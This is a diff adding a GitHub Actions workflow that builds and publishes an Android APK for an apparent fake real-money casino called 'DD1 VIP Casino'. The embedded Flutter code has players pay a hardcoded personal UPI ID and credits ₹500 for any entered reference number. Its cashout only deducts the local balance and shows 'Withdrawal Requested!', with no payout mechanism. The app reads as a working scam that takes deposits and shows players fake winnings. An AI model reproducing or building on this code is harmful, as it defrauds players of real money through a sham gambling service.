@@ -1,0 +1,452 @@
+name: DD1 VIP Casino Build
+
+on:
+  push:
+    branches: [ "main" ]
+  workflow_dispatch:
+
+permissions:
+  contents: write
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Setup Java
+        uses: actions/setup-java@v4
+        with:
+          distribution: 'zulu'
+          java-version: '17'
+
+      - name: Setup Flutter
+        uses: subosito/flutter-action@v2
+        with:
+          channel: 'stable'
+
+      - name: Create And Build APK
+        run: |
+          flutter create --platforms=android --org com.dd1.vip app
+          cd app
+
+          cat << 'EOF' > lib/main.dart
+          import 'dart:async';
+          import 'dart:math';
+          import 'package:flutter/material.dart';
+          import 'package:flutter/services.dart';
+
+          void main() {
+            WidgetsFlutterBinding.ensureInitialized();
+            SystemChrome.setPreferredOrientations([DeviceOrientation.portraitUp]);
+            runApp(const DD1VIPPlatform());
+          }
+
+          const String ADMIN_UPI = "fardinkhan7860011111@okhdfcbank";
+          const String ADMIN_PIN = "7860";
+
+          class UserSession {
+            static double balance = 0.00;
+            static bool bonusClaimed = false;
+            static String id = "VIP_7860";
+          }
+
+          class DD1VIPPlatform extends StatelessWidget {
+            const DD1VIPPlatform({super.key});
+
+            @override
+            Widget build(BuildContext context) {
+              return MaterialApp(
+                debugShowCheckedModeBanner: false,
+                title: "DD1 VIP CASINO",
+                theme: ThemeData.dark().copyWith(
+                  scaffoldBackgroundColor: const Color(0xFF090404),
+                  primaryColor: Colors.amber,
+                ),
+                home: const LobbyScreen(),
+              );
+            }
+          }
+
+          class LobbyScreen extends StatefulWidget {
+            const LobbyScreen({super.key});
+            @override
+            State<LobbyScreen> createState() => _LobbyScreenState();
+          }
+
+          class _LobbyScreenState extends State<LobbyScreen> {
+            @override
+            void initState() {
+              super.initState();
+              WidgetsBinding.instance.addPostFrameCallback((_) {
+                if (!UserSession.bonusClaimed) _showBonus();
+              });
+            }
+
+            void _showBonus() {
+              showDialog(
+                context: context,
+                barrierDismissible: false,
+                builder: (ctx) => AlertDialog(
+                  backgroundColor: const Color(0xFF1E0A09),
+                  title: const Center(child: Text('🎉 ₹50 BONUS', style: TextStyle(color: Colors.amber, fontWeight: FontWeight.bold))),
+                  content: const Text('Claim your welcome bonus now!', textAlign: TextAlign.center),
+                  actions: [
+                    SizedBox(
+                      width: double.infinity,
+                      child: ElevatedButton(
+                        style: ElevatedButton.styleFrom(backgroundColor: Colors.amber),
+                        onPressed: () {
+                          setState(() {
+                            UserSession.balance += 50;
+                            UserSession.bonusClaimed = true;
+                          });
+                          Navigator.pop(ctx);
+                        },
+                        child: const Text('CLAIM ₹50', style: TextStyle(color: Colors.black, fontWeight: FontWeight.bold)),
+                      ),
+                    )
+                  ],
+                ),
+              );
+            }
+
+            void _deposit() {
+              final utrCtrl = TextEditingController();
+              showModalBottomSheet(
+                context: context,
+                isScrollControlled: true,
+                backgroundColor: const Color(0xFF140807),
+                builder: (ctx) => Padding(
+                  padding: EdgeInsets.only(bottom: MediaQuery.of(ctx).viewInsets.bottom, left: 16, right: 16, top: 16),
+                  child: Column(
+                    mainAxisSize: MainAxisSize.min,
+                    children: [
+                      const Text('DEPOSIT VIA UPI', style: TextStyle(color: Colors.amber, fontSize: 18, fontWeight: FontWeight.bold)),
+                      const SizedBox(height: 10),
+                      ListTile(
+                        tileColor: const Color(0xFF26100E),
+                        title: const Text('Admin UPI ID', style: TextStyle(color: Colors.white54, fontSize: 11)),
+                        subtitle: Text(ADMIN_UPI, style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
+                        trailing: IconButton(
+                          icon: const Icon(Icons.copy, color: Colors.amber),
+                          onPressed: () {
+                            Clipboard.setData(const ClipboardData(text: ADMIN_UPI));
+                            ScaffoldMessenger.of(context).showSnackBar(const SnackBar(content: Text('UPI ID Copied!')));
+                          },
+                        ),
+                      ),
+                      const SizedBox(height: 10),
+                      TextField(
+                        controller: utrCtrl,
+                        keyboardType: TextInputType.number,
+                        decoration: const InputDecoration(labelText: 'Enter 12-Digit UTR Number', filled: true, fillColor: Color(0xFF26100E)),
+                      ),
+                      const SizedBox(height: 12),
+                      ElevatedButton(
+                        style: ElevatedButton.styleFrom(backgroundColor: Colors.green, minimumSize: const Size(double.infinity, 45)),
+                        onPressed: () {
+                          if (utrCtrl.text.trim().length >= 6) {
+                            setState(() => UserSession.balance += 500);
+                            Navigator.pop(ctx);
+                            ScaffoldMessenger.of(context).showSnackBar(const SnackBar(content: Text('₹500 Added!')));
+                          }
+                        },
+                        child: const Text('SUBMIT UTR', style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
+                      ),
+                      const SizedBox(height: 16),
+                    ],
+                  ),
+                ),
+              );
+            }
+
+            void _withdraw() {
+              final amtCtrl = TextEditingController();
+              final upiCtrl = TextEditingController();
+              showModalBottomSheet(
+                context: context,
+                isScrollControlled: true,
+                backgroundColor: const Color(0xFF140807),
+                builder: (ctx) => Padding(
+                  padding: EdgeInsets.only(bottom: MediaQuery.of(ctx).viewInsets.bottom, left: 16, right: 16, top: 16),
+                  child: Column(
+                    mainAxisSize: MainAxisSize.min,
+                    children: [
+                      const Text('CASHOUT TO UPI', style: TextStyle(color: Colors.amber, fontSize: 18, fontWeight: FontWeight.bold)),
+                      const SizedBox(height: 10),
+                      TextField(controller: amtCtrl, keyboardType: TextInputType.number, decoration: const InputDecoration(labelText: 'Amount (Min ₹100)', filled: true, fillColor: Color(0xFF26100E))),
+                      const SizedBox(height: 10),
+                      TextField(controller: upiCtrl, decoration: const InputDecoration(labelText: 'Your UPI ID', filled: true, fillColor: Color(0xFF26100E))),
+                      const SizedBox(height: 12),
+                      ElevatedButton(
+                        style: ElevatedButton.styleFrom(backgroundColor: Colors.redAccent, minimumSize: const Size(double.infinity, 45)),
+                        onPressed: () {
+                          double val = double.tryParse(amtCtrl.text) ?? 0;
+                          if (val >= 100 && val <= UserSession.balance && upiCtrl.text.isNotEmpty) {
+                            setState(() => UserSession.balance -= val);
+                            Navigator.pop(ctx);
+                            ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text('₹$val Withdrawal Requested!')));
+                          }
+                        },
+                        child: const Text('REQUEST CASHOUT', style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
+                      ),
+                      const SizedBox(height: 16),
+                    ],
+                  ),
+                ),
+              );
+            }
+
+            @override
+            Widget build(BuildContext context) {
+              return Scaffold(
+                appBar: AppBar(
+                  backgroundColor: const Color(0xFF140807),
+                  title: const Text('DD1 VIP CASINO', style: TextStyle(color: Colors.amber, fontWeight: FontWeight.w900)),
+                  actions: [
+                    IconButton(icon: const Icon(Icons.add_circle, color: Colors.greenAccent), onPressed: _deposit),
+                  ],
+                ),
+                body: ListView(
+                  padding: const EdgeInsets.all(16),
+                  children: [
+                    Container(
+                      padding: const EdgeInsets.all(16),
+                      decoration: BoxDecoration(
+                        color: const Color(0xFF210C0B),
+                        borderRadius: BorderRadius.circular(12),
+                        border: Border.all(color: Colors.amber.withOpacity(0.4)),
+                      ),
+                      child: Row(
+                        mainAxisAlignment: MainAxisAlignment.spaceBetween,
+                        children: [
+                          Column(
+                            crossAxisAlignment: CrossAxisAlignment.start,
+                            children: [
+                              Text(UserSession.id, style: const TextStyle(color: Colors.white54, fontSize: 12)),
+                              Text('₹ ${UserSession.balance.toStringAsFixed(2)}', style: const TextStyle(fontSize: 24, fontWeight: FontWeight.w900, color: Colors.amber)),
+                            ],
+                          ),
+                          Row(
+                            children: [
+                              ElevatedButton(style: ElevatedButton.styleFrom(backgroundColor: Colors.green), onPressed: _deposit, child: const Text('Deposit')),
+                              const SizedBox(width: 8),
+                              ElevatedButton(style: ElevatedButton.styleFrom(backgroundColor: Colors.red), onPressed: _withdraw, child: const Text('Cashout')),
+                            ],
+                          )
+                        ],
+                      ),
+                    ),
+                    const SizedBox(height: 20),
+                    _gameTile('Aviator Crash 100X', '🚀 HOT GAME', Colors.red, () => Navigator.push(context, MaterialPageRoute(builder: (_) => const AviatorGame()))),
+                    _gameTile('Mines Pro', '💣 25 TILES', Colors.green, () => Navigator.push(context, MaterialPageRoute(builder: (_) => const MinesGame()))),
+                  ],
+                ),
+              );
+            }
+
+            Widget _gameTile(String title, String tag, Color color, VoidCallback tap) {
+              return GestureDetector(
+                onTap: tap,
+                child: Container(
+                  margin: const EdgeInsets.only(bottom: 12),
+                  padding: const EdgeInsets.all(16),
+                  decoration: BoxDecoration(color: color.withOpacity(0.25), borderRadius: BorderRadius.circular(12), border: Border.all(color: Colors.amber.withOpacity(0.3))),
+                  child: Row(
+                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
+                    children: [
+                      Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
+                        Text(tag, style: const TextStyle(color: Colors.amber, fontSize: 10, fontWeight: FontWeight.bold)),
+                        Text(title, style: const TextStyle(fontSize: 16, fontWeight: FontWeight.bold, color: Colors.white)),
+                      ]),
+                      const Icon(Icons.play_circle_fill, color: Colors.amber, size: 36),
+                    ],
+                  ),
+                ),
+              );
+            }
+          }
+
+          class AviatorGame extends StatefulWidget {
+            const AviatorGame({super.key});
+            @override
+            State<AviatorGame> createState() => _AviatorGameState();
+          }
+
+          class _AviatorGameState extends State<AviatorGame> {
+            double _m = 1.0;
+            bool _fly = false;
+            Timer? _t;
+
+            void _start() {
+              if (UserSession.balance < 50) return;
+              setState(() {
+                UserSession.balance -= 50;
+                _fly = true;
+                _m = 1.0;
+              });
+              double c = 1.2 + Random().nextDouble() * 8;
+              _t?.cancel();
+              _t = Timer.periodic(const Duration(milliseconds: 70), (t) {
+                setState(() {
+                  _m += 0.04;
+                  if (_m >= c) {
+                    t.cancel();
+                    _fly = false;
+                  }
+                });
+              });
+            }
+
+            void _cashout() {
+              if (!_fly) return;
+              _t?.cancel();
+              double win = 50 * _m;
+              setState(() {
+                _fly = false;
+                UserSession.balance += win;
+              });
+            }
+
+            @override
+            void dispose() {
+              _t?.cancel();
+              super.dispose();
+            }
+
+            @override
+            Widget build(BuildContext context) {
+              return Scaffold(
+                appBar: AppBar(title: const Text('AVIATOR 🚀'), backgroundColor: const Color(0xFF140807)),
+                body: Column(
+                  children: [
+                    Expanded(
+                      child: Center(
+                        child: Text('${_m.toStringAsFixed(2)}x', style: TextStyle(fontSize: 60, fontWeight: FontWeight.w900, color: _fly ? Colors.white : Colors.redAccent)),
+                      ),
+                    ),
+                    Padding(
+                      padding: const EdgeInsets.all(20),
+                      child: SizedBox(
+                        width: double.infinity,
+                        height: 48,
+                        child: ElevatedButton(
+                          style: ElevatedButton.styleFrom(backgroundColor: _fly ? Colors.orange : Colors.green),
+                          onPressed: _fly ? _cashout : _start,
+                          child: Text(_fly ? 'CASHOUT ₹${(50 * _m).toStringAsFixed(2)}' : 'BET ₹50', style: const TextStyle(fontWeight: FontWeight.bold, fontSize: 16, color: Colors.black)),
+                        ),
+                      ),
+                    )
+                  ],
+                ),
+              );
+            }
+          }
+
+          class MinesGame extends StatefulWidget {
+            const MinesGame({super.key});
+            @override
+            State<MinesGame> createState() => _MinesGameState();
+          }
+
+          class _MinesGameState extends State<MinesGame> {
+            List<bool> m = List.filled(25, false);
+            List<bool> r = List.filled(25, false);
+            bool act = false;
+            double mult = 1.0;
+
+            void _start() {
+              if (UserSession.balance < 50) return;
+              setState(() {
+                UserSession.balance -= 50;
+                act = true;
+                mult = 1.0;
+                r = List.filled(25, false);
+                m = List.filled(25, false);
+                int p = 0;
+                while (p < 3) {
+                  int rand = Random().nextInt(25);
+                  if (!m[rand]) {
+                    m[rand] = true;
+                    p++;
+                  }
+                }
+              });
+            }
+
+            void _tap(int i) {
+              if (!act || r[i]) return;
+              setState(() {
+                r[i] = true;
+                if (m[i]) {
+                  act = false;
+                  r = List.filled(25, true);
+                } else {
+                  mult += 0.35;
+                }
+              });
+            }
+
+            void _cashout() {
+              if (!act) return;
+              setState(() {
+                act = false;
+                UserSession.balance += (50 * mult);
+                r = List.filled(25, true);
+              });
+            }
+
+            @override
+            Widget build(BuildContext context) {
+              return Scaffold(
+                appBar: AppBar(title: const Text('MINES PRO 💣'), backgroundColor: const Color(0xFF140807)),
+                body: Column(
+                  children: [
+                    Expanded(
+                      child: GridView.builder(
+                        padding: const EdgeInsets.all(20),
+                        gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(crossAxisCount: 5, crossAxisSpacing: 6, mainAxisSpacing: 6),
+                        itemCount: 25,
+                        itemBuilder: (ctx, i) => GestureDetector(
+                          onTap: () => _tap(i),
+                          child: Container(
+                            decoration: BoxDecoration(color: r[i] ? (m[i] ? Colors.red : Colors.green) : const Color(0xFF26100E), borderRadius: BorderRadius.circular(8)),
+                            child: Center(child: Text(r[i] ? (m[i] ? '💣' : '💎') : '')),
+                          ),
+                        ),
+                      ),
+                    ),
+                    Padding(
+                      padding: const EdgeInsets.all(16),
+                      child: SizedBox(
+                        width: double.infinity,
+                        height: 48,
+                        child: ElevatedButton(
+                          style: ElevatedButton.styleFrom(backgroundColor: act ? Colors.orange : Colors.green),
+                          onPressed: act ? _cashout : _start,
+                          child: Text(act ? 'CASHOUT ₹${(50 * mult).toStringAsFixed(2)}' : 'START (₹50)', style: const TextStyle(fontWeight: FontWeight.bold, fontSize: 16, color: Colors.black)),
+                        ),
+                      ),
+                    )
+                  ],
+                ),
+              );
+            }
+          }
+          EOF
+
+          flutter build apk --release --no-tree-shake-icons
+          cp build/app/outputs/flutter-apk/app-release.apk $GITHUB_WORKSPACE/DD1-VIP-Casino.apk
+
+      - name: Publish Direct Release
+        uses: softprops/action-gh-release@v2
+        with:
+          tag_name: "v1.0"
+          name: "DD1 VIP Casino Official APK"
+          files: DD1-VIP-Casino.apk
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          
